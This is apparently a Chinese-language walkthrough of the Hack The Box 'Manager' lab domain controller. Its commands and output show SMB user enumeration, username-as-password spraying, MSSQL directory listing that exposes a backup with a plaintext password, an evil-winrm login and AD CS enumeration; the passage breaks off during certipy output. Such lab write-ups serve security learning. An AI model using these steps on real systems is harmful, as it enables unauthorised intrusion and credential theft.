---
title: HTB-Manager Writeup
date: 2026-10-20T14:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - HTB
  - Writeup
  - Windows
  - LDAP
  - SMB
  - MSSQL
  - NTLM
  - GetNPUsers
  - 密码喷射
  - Shadow_Credentials
  - Certipy
  - ESC7
---
## Nmap 探测

使用 nmap 扫描开放的端口。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Manager]
└─$ sudo nmap --min-rate 10000 -p- 10.129.55.226 -oA Nmap/ports
[sudo] password for kali:
Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-15 02:52 -0400
Nmap scan report for 10.129.55.226
Host is up (0.16s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49685/tcp open  unknown
49686/tcp open  unknown
49687/tcp open  unknown
49724/tcp open  unknown
49769/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 36.05 seconds
```

对开放的端口做详细信息扫描。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Manager]
└─$ sudo nmap -sT -sC -sV -O -p 53,80,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49685,49686,49687,49724,49769 10.129.56.204
[sudo] password for kali:
Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-16 02:29 -0400
Nmap scan report for 10.129.56.204
Host is up (0.11s latency).

PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
80/tcp    open     http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Manager
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-16 13:28:12Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-10-16T13:29:47+00:00; +6h59m00s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
|_ssl-date: 2026-10-16T13:29:47+00:00; +6h59m01s from scanner time.
1433/tcp  open     ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info:
|   10.129.56.204:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2026-10-16T13:29:47+00:00; +6h59m00s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-10-16T13:20:11
|_Not valid after:  2056-10-16T13:20:11
| ms-sql-ntlm-info:
|   10.129.56.204:1433:
|     Target_Name: MANAGER
|     NetBIOS_Domain_Name: MANAGER
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: manager.htb
|     DNS_Computer_Name: dc01.manager.htb
|     DNS_Tree_Name: manager.htb
|_    Product_Version: 10.0.17763
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-10-16T13:29:47+00:00; +6h59m00s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
3269/tcp  open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.manager.htb
| Not valid before: 2024-08-30T17:08:51
|_Not valid after:  2122-07-27T10:31:04
|_ssl-date: 2026-10-16T13:29:47+00:00; +6h59m01s from scanner time.
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open     mc-nmf        .NET Message Framing
49667/tcp open     msrpc         Microsoft Windows RPC
49685/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
49686/tcp open     msrpc         Microsoft Windows RPC
49687/tcp filtered unknown
49724/tcp filtered unknown
49769/tcp open     unknown
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-10-16T13:29:10
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m00s, deviation: 0s, median: 6h58m59s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.51 seconds
```

开放了 53、80、88、389、636、3268、1433、5985 端口，是一台域控。

将暴露出来的域名解析至 hots。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Manager]
└─$ tail -n 1 /etc/hosts
10.129.56.204 dc01.manager.htb manager.htb
```

## Web 渗透

访问 80 端口，初步浏览没有发现特别值的注意的入口。

![](Pasted%20image%2020261016143739.png)

![](Pasted%20image%2020261016143912.png)

同步一下时间，以免后续操作因为时间偏差报错。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Manager]
└─$ sudo ntpdate 10.129.56.204
2026-10-16 09:46:05.047852 (-0400) +25140.365511 +/- 0.054899 10.129.56.204 s1 no-leap
CLOCK: time stepped by 25140.365511
```

## 域信息收集

用 ldapsearch 读 rootDSE，LDAP 规范要求匿名也可以访问它，如果返回成功则表明服务存活。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Manager]
└─$ ldapsearch -x -H ldap://10.129.56.204 -s base -b "" "(objectClass=*)" namingContexts defaultNamingContext
# extended LDIF
#
# LDAPv3
# base <> with scope baseObject
# filter: (objectClass=*)
# requesting: namingContexts defaultNamingContext
#

#
dn:
defaultNamingContext: DC=manager,DC=htb
namingContexts: DC=manager,DC=htb
namingContexts: CN=Configuration,DC=manager,DC=htb
namingContexts: CN=Schema,CN=Configuration,DC=manager,DC=htb
namingContexts: DC=DomainDnsZones,DC=manager,DC=htb
namingContexts: DC=ForestDnsZones,DC=manager,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

进一步查询返回 Operator error，表明匿名身份可以读取 rootDES，但是不允许做子树搜索，放弃这条路。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Manager]
└─$ ldapsearch -x -H ldap://10.129.56.204 -s sub -b "DC=manager,DC=htb"  "(objectClass=user)"  sAMAccountName
# extended LDIF
#
# LDAPv3
# base <DC=manager,DC=htb> with scope subtree
# filter: (objectClass=user)
# requesting: sAMAccountName
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090CF4, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1
```

## SMB 探索

尝试匿名访问 smb 失败，但是以 guest 身份访问列举出来了共享。

没有自定义共享。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Manager]
└─$ nxc smb 10.129.56.204 -u '' -p '' --shares
SMB         10.129.56.204   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.56.204   445    DC01             [+] manager.htb\:
SMB         10.129.56.204   445    DC01             [-] Error enumerating shares: STATUS_ACCESS_DENIED
┌──(kali㉿kali)-[~/Work/Kali/Manager]
└─$ nxc smb 10.129.56.204 -u 'enil' -p '' --shares
SMB         10.129.56.204   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.56.204   445    DC01             [+] manager.htb\enil: (Guest)
SMB         10.129.56.204   445    DC01             [*] Enumerated shares
SMB         10.129.56.204   445    DC01             Share           Permissions     Remark
SMB         10.129.56.204   445    DC01             -----           -----------     ------
SMB         10.129.56.204   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.56.204   445    DC01             C$                              Default share
SMB         10.129.56.204   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.56.204   445    DC01             NETLOGON                        Logon server share
SMB         10.129.56.204   445    DC01             SYSVOL                          Logon server share
```

RID 递推的做法是拿一个编号去问这个 SID 对应谁，逐个数着问。它走的是 SMB 上的 RPC，与 LDAP 是两套独立的权限模型，所以 LDAP 匿名被拒并不影响它。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Manager]
└─$ nxc smb 10.129.56.204 -u 'enil' -p '' --rid-brute 5000
SMB         10.129.56.204   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.56.204   445    DC01             [+] manager.htb\enil: (Guest)
SMB         10.129.56.204   445    DC01             498: MANAGER\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.56.204   445    DC01             500: MANAGER\Administrator (SidTypeUser)
SMB         10.129.56.204   445    DC01             501: MANAGER\Guest (SidTypeUser)
SMB         10.129.56.204   445    DC01             502: MANAGER\krbtgt (SidTypeUser)
SMB         10.129.56.204   445    DC01             512: MANAGER\Domain Admins (SidTypeGroup)
SMB         10.129.56.204   445    DC01             513: MANAGER\Domain Users (SidTypeGroup)
SMB         10.129.56.204   445    DC01             514: MANAGER\Domain Guests (SidTypeGroup)
SMB         10.129.56.204   445    DC01             515: MANAGER\Domain Computers (SidTypeGroup)
SMB         10.129.56.204   445    DC01             516: MANAGER\Domain Controllers (SidTypeGroup)
SMB         10.129.56.204   445    DC01             517: MANAGER\Cert Publishers (SidTypeAlias)
SMB         10.129.56.204   445    DC01             518: MANAGER\Schema Admins (SidTypeGroup)
SMB         10.129.56.204   445    DC01             519: MANAGER\Enterprise Admins (SidTypeGroup)
SMB         10.129.56.204   445    DC01             520: MANAGER\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.56.204   445    DC01             521: MANAGER\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.56.204   445    DC01             522: MANAGER\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.56.204   445    DC01             525: MANAGER\Protected Users (SidTypeGroup)
SMB         10.129.56.204   445    DC01             526: MANAGER\Key Admins (SidTypeGroup)
SMB         10.129.56.204   445    DC01             527: MANAGER\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.56.204   445    DC01             553: MANAGER\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.56.204   445    DC01             571: MANAGER\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.56.204   445    DC01             572: MANAGER\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.56.204   445    DC01             1000: MANAGER\DC01$ (SidTypeUser)
SMB         10.129.56.204   445    DC01             1101: MANAGER\DnsAdmins (SidTypeAlias)
SMB         10.129.56.204   445    DC01             1102: MANAGER\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.56.204   445    DC01             1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
SMB         10.129.56.204   445    DC01             1113: MANAGER\Zhong (SidTypeUser)
SMB         10.129.56.204   445    DC01             1114: MANAGER\Cheng (SidTypeUser)
SMB         10.129.56.204   445    DC01             1115: MANAGER\Ryan (SidTypeUser)
SMB         10.129.56.204   445    DC01             1116: MANAGER\Raven (SidTypeUser)
SMB         10.129.56.204   445    DC01             1117: MANAGER\JinWoo (SidTypeUser)
SMB         10.129.56.204   445    DC01             1118: MANAGER\ChinHae (SidTypeUser)
SMB         10.129.56.204   445    DC01             1119: MANAGER\Operator (SidTypeUser)
```

将暴露出来的用户保存下来，去除掉默认的帐号。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Manager]
└─$ cat users.txt
Zhong
Cheng
Ryan
Raven
JinWoo
ChinHae
Operator
```

## AS-REP

GetNPUsers 不需要任何凭据，只向 KDC 询问哪个帐户关闭了 Kerberos 预认证。七个用户全部要求域认证。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Manager]
└─$ impacket-GetNPUsers manager.htb/ -no-pass -usersfile users.txt -dc-ip 10.129.56.204
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] User Zhong doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Cheng doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Ryan doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Raven doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User JinWoo doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ChinHae doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Operator doesn't have UF_DONT_REQUIRE_PREAUTH set
```

将用户名首字母修改为小写保存为 `passwords.txt`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Manager]
└─$ cat passwords.txt
zhong
cheng
ryan
raven
jinwoo
chinhae
operator
```

用户名当密码是常见的弱口令，可以尝试一下，发现 Operator 的帐号与密码是相同的。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Manager]
└─$ nxc smb 10.129.58.202 -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
SMB         10.129.58.202   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.58.202   445    DC01             [-] Connection Error: The NETBIOS connection with the remote host timed out.
SMB         10.129.58.202   445    DC01             [-] manager.htb\Cheng:cheng STATUS_LOGON_FAILURE
SMB         10.129.58.202   445    DC01             [-] manager.htb\Ryan:ryan STATUS_LOGON_FAILURE
SMB         10.129.58.202   445    DC01             [-] manager.htb\Raven:raven STATUS_LOGON_FAILURE
SMB         10.129.58.202   445    DC01             [-] manager.htb\JinWoo:jinwoo STATUS_LOGON_FAILURE
SMB         10.129.58.202   445    DC01             [-] manager.htb\ChinHae:chinhae STATUS_LOGON_FAILURE
SMB         10.129.58.202   445    DC01             [+] manager.htb\Operator:operator
```

列出 Operator 下的共享目录，没有更进一步的发现。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Manager]
└─$ nxc smb 10.129.58.202 -u Operator -p 'operator' --shares
SMB         10.129.58.202   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.58.202   445    DC01             [+] manager.htb\Operator:operator
SMB         10.129.58.202   445    DC01             [*] Enumerated shares
SMB         10.129.58.202   445    DC01             Share           Permissions     Remark
SMB         10.129.58.202   445    DC01             -----           -----------     ------
SMB         10.129.58.202   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.58.202   445    DC01             C$                              Default share
SMB         10.129.58.202   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.58.202   445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.58.202   445    DC01             SYSVOL          READ            Logon server share
```

尝试一下 Operator 有没有 WinRM 权限，结果是没有。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Manager]
└─$ nxc winrm 10.129.58.202 -u Operator -p 'operator'
WINRM       10.129.58.202   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:manager.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.58.202   5985   DC01             [-] manager.htb\Operator:operator
```

## MSSQL

尝试一下 Operator 有没有MSSQL 权限，登上去了。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Manager]
└─$ impacket-mssqlclient manager.htb/Operator:operator@10.129.58.202 -windows-auth
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (MANAGER\Operator  guest@master)> 
```

### XP_DIRTREE

```bash
SQL (MANAGER\Operator  guest@master)> SELECT SYSTEM_USER AS login_name,SUSER_SNAME() AS login_display,IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin;
login_name         login_display      is_sysadmin   
----------------   ----------------   -----------   
MANAGER\Operator   MANAGER\Operator             0 
```

枚举一下数据库。

四个库都是系统自带的， master 存登录与实例配置，model 是新建库的模版，msdb 放代理作业和备份历史，tempdb 是临时对象。没有任何业务库，意味着这条路在数据层面没有东西可读。

```bash
SQL (MANAGER\Operator  guest@master)> SELECT name,state_desc FROM sys.databases;
name     state_desc   
------   ----------   
master   ONLINE       
tempdb   ONLINE       
model    ONLINE       
msdb     ONLINE
```

查询一下权限边界。`fn_my_permissions` 返回当前登录在指定范围那的有效权限，第一个参数给 NULL 表示服务器级，第二个参数说明查的是服务器范围而不是某个数据库。

```bash
SQL (MANAGER\Operator  guest@master)> SELECT * FROM fn_my_permissions(NULL,'SERVER');
entity_name   subentity_name   permission_name     
-----------   --------------   -----------------   
server                         CONNECT SQL         
server                         VIEW ANY DATABASE 
```

只有两个权限，CONNECT SQL 和 VIEW ANY DATABASE，也就是 public 角色的最低档。

xp_dirtree 是扩展存储的过程，执行权限默认授予 public，所以哪怕是 guest 身份也能调用。它以 SQL 服务帐号权限去读文件系统，能把目录和文件名列出来，但读不了文件内容。三个参数分别的路径、递归深度、是否包含文件。

枚举一下 C 盘下的文件。

```bash
SQL (MANAGER\Operator  guest@master)> EXEC master..xp_dirtree 'C:\',1,0;
subdirectory                depth   
-------------------------   -----   
$Recycle.Bin                    1   
Documents and Settings          1   
inetpub                         1   
PerfLogs                        1   
Program Files                   1   
Program Files (x86)             1   
ProgramData                     1   
Recovery                        1   
SQL2019                         1   
System Volume Information       1   
Users                           1   
Windows                         1
```

继续枚举发现 Website 备份文件。

```bash
SQL (MANAGER\Operator  guest@master)> EXEC master..xp_dirtree 'C:\inetpub\wwwroot',1,1;
subdirectory                      depth   file   
-------------------------------   -----   ----   
about.html                            1      1   
contact.html                          1      1   
css                                   1      0   
images                                1      0   
index.html                            1      1   
js                                    1      0   
service.html                          1      1   
web.config                            1      1   
website-backup-27-07-23-old.zip       1      1
```

backup 文件放在 web 根里，意味着不需要额外权限就能直接下载。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Manager]
└─$ wget "http://manager.htb/website-backup-27-07-23-old.zip"
--2026-10-19 22:56:02--  http://manager.htb/website-backup-27-07-23-old.zip
Resolving manager.htb (manager.htb)... 10.129.58.202
Connecting to manager.htb (manager.htb)|10.129.58.202|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1045328 (1021K) [application/x-zip-compressed]
Saving to: ‘website-backup-27-07-23-old.zip’

website-backup-27-07-23-old.zip      100%[======================================================================>]   1021K   511KB/s    in 2.0s

2026-10-19 22:56:04 (511 KB/s) - ‘website-backup-27-07-23-old.zip’ saved [1045328/1045328]
┌──(kali㉿kali)-[~/Work/Kali/Manager]
└─$ ls -liah website-backup-27-07-23-old.zip
3552829 -rw-rw-r-- 1 kali kali 1021K Jul 27  2023 website-backup-27-07-23-old.zip
```

解压下来，发现一个 `.old-conf.xml`。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Manager/Website]
└─$ ls -liah
total 1.1M
3551891 drwxrwxr-x 5 kali kali  4.0K Oct 19 23:01 .
3552892 drwxrwxr-x 4 kali kali  4.0K Oct 19 23:01 ..
3552863 -rw-rw-r-- 1 kali kali  5.3K Jul 27  2023 about.html
3552871 -rw-rw-r-- 1 kali kali  5.2K Jul 27  2023 contact.html
3552875 drwxrwxr-x 2 kali kali  4.0K Oct 19 23:01 css
3552893 drwxrwxr-x 2 kali kali  4.0K Oct 19 23:01 images
3553052 -rw-rw-r-- 1 kali kali   18K Jul 27  2023 index.html
3553053 drwxrwxr-x 2 kali kali  4.0K Oct 19 23:01 js
3552836 -rw-rw-r-- 1 kali kali   698 Jul 27  2023 .old-conf.xml
3553056 -rw-rw-r-- 1 kali kali  7.8K Jul 27  2023 service.html
3552829 -rw-rw-r-- 1 kali kali 1021K Jul 27  2023 website-backup-27-07-23-old.zip
```

查看发现 raven 的密码。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Manager/Website]
└─$ cat .old-conf.xml
<?xml version="1.0" encoding="UTF-8"?>
<ldap-conf xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
   <server>
      <host>dc01.manager.htb</host>
      <open-port enabled="true">389</open-port>
      <secure-port enabled="false">0</secure-port>
      <search-base>dc=manager,dc=htb</search-base>
      <server-type>microsoft</server-type>
      <access-user>
         <user>raven@manager.htb</user>
         <password>R4v3nBe5tD3veloP3r!123</password>
      </access-user>
      <uid-attribute>cn</uid-attribute>
   </server>
   <search type="full">
      <dir-list>
         <dir>cn=Operator1,CN=users,dc=manager,dc=htb</dir>
      </dir-list>
   </search>
</ldap-conf>
```

查看权限发现可以登录 WinRM。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Manager/Website]
└─$ nxc smb 10.129.58.202 -u raven -p 'R4v3nBe5tD3veloP3r!123'
SMB         10.129.58.202   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.58.202   445    DC01             [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123
┌──(kali㉿kali)-[~/Work/Kali/Manager/Website]
└─$ nxc winrm 10.129.58.202 -u raven -p 'R4v3nBe5tD3veloP3r!123'
WINRM       10.129.58.202   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:manager.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.58.202   5985   DC01             [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123 (Pwn3d!)
```

使用 evil-winrm 登录。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Manager/Website]
└─$ evil-winrm -i 10.129.58.202 -u raven -p 'R4v3nBe5tD3veloP3r!123'              
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Raven\Documents> whoami
manager\raven
```

## 提权至 Administration

枚举权限和监听，没有有价值的发现。

```bash
*Evil-WinRM* PS C:\Users\Raven\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

```bash
*Evil-WinRM* PS C:\Users\Raven\Desktop> netstat -ano | findstr LISTENING                                                                            
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4                                                                            
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       628                                                                          
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       888                                                                          
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       628                                                                          
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4                                                                            
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       628                                                                          
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       888                                                                          
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       628                                                                          
  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       3736                                                                         
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       628                                                                          
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       628                                                                          
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4                                                                            
  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       2216                                                                         
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4                                                                            
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       472                                                                          
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1116                                                                         
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1600                                                                         
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       628                                                                          
  TCP    0.0.0.0:49685          0.0.0.0:0              LISTENING       628                                                                          
  TCP    0.0.0.0:49686          0.0.0.0:0              LISTENING       628                                                                          
  TCP    0.0.0.0:49689          0.0.0.0:0              LISTENING       628
  TCP    0.0.0.0:49715          0.0.0.0:0              LISTENING       608
  TCP    0.0.0.0:49725          0.0.0.0:0              LISTENING       2492
  TCP    0.0.0.0:49774          0.0.0.0:0              LISTENING       2224
  TCP    0.0.0.0:59496          0.0.0.0:0              LISTENING       3736
  TCP    0.0.0.0:59950          0.0.0.0:0              LISTENING       4140
  TCP    10.129.58.202:53       0.0.0.0:0              LISTENING       2492
  TCP    10.129.58.202:139      0.0.0.0:0              LISTENING       4
  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       2492
   TCP    [::]:80                [::]:0                 LISTENING       4
  TCP    [::]:88                [::]:0                 LISTENING       628
  TCP    [::]:135               [::]:0                 LISTENING       888
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:464               [::]:0                 LISTENING       628
  TCP    [::]:593               [::]:0                 LISTENING       888
  TCP    [::]:1433              [::]:0                 LISTENING       3736
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:9389              [::]:0                 LISTENING       2216
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       472
  TCP    [::]:49665             [::]:0                 LISTENING       1116
  TCP    [::]:49666             [::]:0                 LISTENING       1600
  TCP    [::]:49667             [::]:0                 LISTENING       628
  TCP    [::]:49685             [::]:0                 LISTENING       628
  TCP    [::]:49686             [::]:0                 LISTENING       628
  TCP    [::]:49689             [::]:0                 LISTENING       628
  TCP    [::]:49715             [::]:0                 LISTENING       608
  TCP    [::]:49725             [::]:0                 LISTENING       2492
  TCP    [::]:49774             [::]:0                 LISTENING       2224
  TCP    [::]:59496             [::]:0                 LISTENING       3736
  TCP    [::]:59950             [::]:0                 LISTENING       4140
  TCP    [::1]:53               [::]:0                 LISTENING       2492
```

### 证书服务

certutil 是系统自带的证书服务工具，getconfig 可以读取本机证书服务的配置字符串，不做任何网络请求。

```bash
*Evil-WinRM* PS C:\Users\Raven\Desktop> certutil -getconfig
Config String: "dc01.manager.htb\manager-DC01-CA"
CertUtil: -getconfig command completed successfully.
```

在 Kali 中，certipy 的 find 分两步取数。先通过 LDAP 读域里的证书模版和注册服务对象，确认 CA 是否存在、发布了哪些模版；再通过 远程注册表读出 CA 自身的标志位，比如是否允许申请者自带 SAN、是否强制加密请求。最后漏洞判定会结合当前用户的嵌套组成员关系，所以同一份输出换一个帐号跑，结论可能不同。

`-valnerable` 只显示当前身份真正可利用的条目，`-stdout` 把结果直接打在终端而不是写成文件。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Manager]
└─$ certipy-ad find -u Raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.58.202 -vulnerable -stdout
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'manager-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'manager-DC01-CA'
[*] Checking web enrollment for CA 'manager-DC01-CA' @ 'dc01.manager.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : manager-DC01-CA
    DNS Name                            : dc01.manager.htb
